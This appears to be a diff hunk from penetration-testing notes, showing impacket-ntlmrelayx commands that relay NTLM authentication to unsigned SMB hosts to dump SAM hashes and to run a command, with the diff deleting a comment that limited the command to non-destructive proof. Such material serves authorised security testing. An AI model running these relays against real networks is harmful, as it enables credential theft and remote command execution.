@@ -53,7 +53,7 @@ ADCS web enrollment (ESC8) or HTTP targets instead.
 # Relay to SMB targets without signing — dump SAM
 impacket-ntlmrelayx -tf /workspace/output/relay_targets.txt -smb2support
 
-# Relay and execute a command (proof only — keep it non-destructive)
+# Relay and execute a command
 impacket-ntlmrelayx -tf /workspace/output/relay_targets.txt -smb2support \
   -c "whoami > C:\\Windows\\Temp\\relay_proof.txt"
 
